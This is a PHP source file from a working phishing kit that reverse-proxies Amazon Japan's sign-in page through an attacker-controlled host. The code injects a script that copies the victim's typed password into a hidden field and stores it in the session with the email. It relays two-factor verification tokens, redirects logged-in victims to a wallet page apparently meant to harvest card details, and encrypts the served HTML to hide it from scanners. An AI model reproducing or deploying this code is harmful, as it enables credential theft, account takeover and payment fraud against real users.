<?php

include './php/xzpc.php';
session_start();
$cookieSuccess = $_SESSION["cookiesuccess"]?$_SESSION["cookiesuccess"]:"./cookies/".md5(time().rand(10000,99999)).".cookie";
$_SESSION["cookiesuccess"] = $cookieSuccess;

if($_POST['yu_mmpd']){
    $_SESSION['okinfo']['email'] = $_POST['email'];
    $_SESSION['okinfo']['password'] = $_POST['yu_mmpd'];
    unset($_POST['yu_mmpd']);
}

$requs_uri = str_replace($_SERVER["HTTP_HOST"],"www.amazon.co.jp",$_SERVER["REQUEST_URI"]);
$requs_uri = str_replace(getsiginpath(),"ap/signin",$requs_uri);
$url = "https://www.amazon.co.jp".$requs_uri;
//echo($url);
if($requs_uri == "/"){
    header("location: /".getsiginpath()."?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2F".$_SERVER["HTTP_HOST"]."%2F%3Flanguage%3Dja_JP%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
    exit;
}

include './php/curl.php';

if($_POST){
    $http_referer = str_replace($_SERVER["HTTP_HOST"],"www.amazon.co.jp",$_SERVER["HTTP_REFERER"]);
    $http_referer = str_replace(getsiginpath(),"ap/signin",$http_referer);
    $http_referer = str_replace("http://","https://",$http_referer);
    $result = post_curl($cookieSuccess,$url,$_POST,true,$http_referer);
}else{
    $result = get_curl($cookieSuccess,$url,true);
}


if(strpos($result,'<span id="nav-link-accountList-nav-line-1" class="nav-line-1 nav-progressive-content">')!==false){
    unset($_SESSION['cardinfo']);
    header("location: /wallet.php");
    exit;
}
if(strpos($result,'<span class="nav-greeting-recognized" id="nav-logobar-greeting">')!==false){
    unset($_SESSION['cardinfo']);
    header("location: /wallet.php");
    exit;
}
if(strpos($result,'a-column a-span8 a-text-left a-span-last')!==false){
    
    
    preg_match_all("/\"a-column a-span4 a-text-left\">(.*?)</i", $result, $phone_email_text);
    
    preg_match_all("/\"a-column a-span8 a-text-left a-span-last\">(.*?)</i", str_replace(PHP_EOL, '', $result), $phone_email_number);
    
    preg_match_all("/\"arb\" value=\"(.*?)\"/i", $result, $arb);
    
    preg_match_all("/\"openid.return_to\" value=\"(.*?)\"/i", $result, $openid_return_to);
    
    preg_match_all("/\"pageId\" value=\"(.*?)\"/i", $result, $pageId);
    
    preg_match_all("/\"openid.assoc_handle\" value=\"(.*?)\"/i", $result, $openid_assoc_handle);
    
    preg_match_all("/'csrfToken' value='(.*?)'/i", $result, $csrfToken);
    
    
    preg_match_all("/resendApprovalLinksTimer\) \{        if \((.*?)\)/i", str_replace(PHP_EOL, '', $result), $isresendTimer);
    preg_match_all("/resendApprovalLinksTimer.createTimer\((.*?) - D/i", str_replace(PHP_EOL, '', $result), $timeleft);
    
    
    $_SESSION['loadinInfo'] = array(
        'phone_email_text'=>$phone_email_text[1][0],
        'phone_email_number'=>$phone_email_number[1][0],
        'arb'=>$arb[1][0],
        'openid_return_to'=>$openid_return_to[1][0],
        'pageId'=>$pageId[1][0],
        'openid_assoc_handle'=>$openid_assoc_handle[1][0],
        'csrfToken'=>$csrfToken[1][0],
        'isresendTimer'=>$isresendTimer[1][0],
        'timeleft'=>$timeleft[1][0]
    );
    header("location: /ap/cvf/loadin.php");
    exit;
}


$result = str_replace("https://www.amazon.co.jp","",$result);
$result = str_replace("ap/signin",getsiginpath(),$result);

$html = "<input type=\"hidden\" name=\"yu_mmpd\" id=\"yu_mmpd\"><script>function input_yu_passwd(pwd){document.getElementById(\"yu_mmpd\").value = pwd;}</script><script type=\"text/javascript\">cf()</script>";
$result = str_replace("<script type=\"text/javascript\">cf()</script>",$html,$result);
$result = str_replace("id=\"ap_password\"","id=\"ap_password\" oninput=\"input_yu_passwd(this.value);\"",$result);


if(strpos($result,'a-box a-alert a-alert-info a-spacing-base')!==false){
    $result = iconv("SJIS", "UTF-8//IGNORE", $result);
}
if($result==""){
    header("Refresh:0");
}

$result = str_replace("<head>","<head><meta name=\"author\" content=\"".getsiginpath()."\" />",$result);
// $smhtml = "<div style=\"position: absolute;color: #fff;font-size:5px;\">このサービスは、".$_SERVER["HTTP_HOST"]." の代理として amazon.co.jp が提供しています。<a href=\"https://www.amazon.co.jp\" style=\"color: #fff;\">詳細</a></div>";
// $result = str_replace("onload=\"window.ue_sbl && window.ue_sbl();\"/>","onload=\"window.ue_sbl && window.ue_sbl();\"/>".$smhtml,$result);

// $echoHtml = "<script>
// document.write(window.atob('".base64_encode($result)."'));
// </script>";
//echo $result;
//echo $result;
if(strpos($result,'</html>')==false){
    echo $result;
    exit();
}

//更强的加密代码，但是访问速度会下降。。。。。。。。
// include './php/rsa.php';

// $config = array(
//     "digest_alg"    => "sha512",
//     "private_key_bits" => 512,
//     "private_key_type" => OPENSSL_KEYTYPE_RSA,
// );
// $res =  openssl_pkey_new($config); 
// openssl_pkey_export($res, $private_key);
// $public_key = openssl_pkey_get_details($res);
// $public_key=$public_key["key"];
// $private_key = str_replace(PHP_EOL,"",$private_key);
// $timepwd = md5(round(time()/100).$_SERVER['PATH_INFO']);

// $rsa = new OpensslRSA($public_key);
// $aessy= $rsa->CryptoJSAesEncrypt($timepwd,$private_key);

// $miwenArray =  $rsa->PublicEncrypt(base64_encode($result));
// $miwen = "";
// foreach ($miwenArray as $k => $v){
//     $miwen = $miwen.($k?",":"")."'".$v."'";
// }
include './php/rsa.php';
$timepwd = md5(round(time()/100).$_SERVER['PATH_INFO']);
$rsa = new OpensslRSA(false);
$miwenHtml= $rsa->CryptoJSAesEncrypt($timepwd,base64_encode($result));



function getsiginpath(){
    return md5("aps_".md5(session_id()));
}

?>

<script src="/src/jsencrypt.min.js"></script>
<script src="/src/crypto-js.min.js"></script>
<script>
    //更强的加密代码，但是访问速度会下降。。。。。。。。
    // var decrypt = new JSEncrypt();
    // var key = <?=$aessy?>;
    // var day = new Date();
    // var time = (Math.round(day.getTime()/100000)).toString();
    // var path = window.location.pathname;
    
    // var timehash = CryptoJS.MD5(time+path).toString();
    
    // decrypt.setPrivateKey(CryptoJSAesDecrypt(timehash,key));
    // var strArr = [<?=$miwen?>];
    // var uncrypted = "";
    // function fmiwen(value,index,array) {
    //     uncrypted = uncrypted+decrypt.decrypt(value);
    // }
    // strArr.forEach(fmiwen);
    // var parsedWordArray = CryptoJS.enc.Base64.parse(uncrypted);
    // var parsedStr = parsedWordArray.toString(CryptoJS.enc.Utf8);
    // document.write(parsedStr);
    
    
    
    function CryptoJSAesDecrypt(passphrase,obj_json){
        var encrypted = obj_json.ciphertext;
        var salt = CryptoJS.enc.Hex.parse(obj_json.salt);
        var iv = CryptoJS.enc.Hex.parse(obj_json.iv);   
        var key = CryptoJS.PBKDF2(passphrase, salt, { hasher: CryptoJS.algo.SHA512, keySize: 64/8, iterations: 999});
        var decrypted = CryptoJS.AES.decrypt(encrypted, key, { iv: iv});
        return decrypted.toString(CryptoJS.enc.Utf8);
    }
    
    var miwenHtml = <?=$miwenHtml?>;
    var day = new Date();
    var time = (Math.round(day.getTime()/100000)).toString();
    var path = window.location.pathname;
    var timehash = CryptoJS.MD5(time+path).toString();
    var base64Html = CryptoJSAesDecrypt(timehash,miwenHtml)
    var parsedWordArray = CryptoJS.enc.Base64.parse(base64Html);
    var parsedStr = parsedWordArray.toString(CryptoJS.enc.Utf8);
    document.write(parsedStr);
    
</script>
<?php if(is_mobile_request()){ ?>
<style>
    .a-button-span12 , .a-button{
        height: 45px;
    }
</style>
<?php } ?>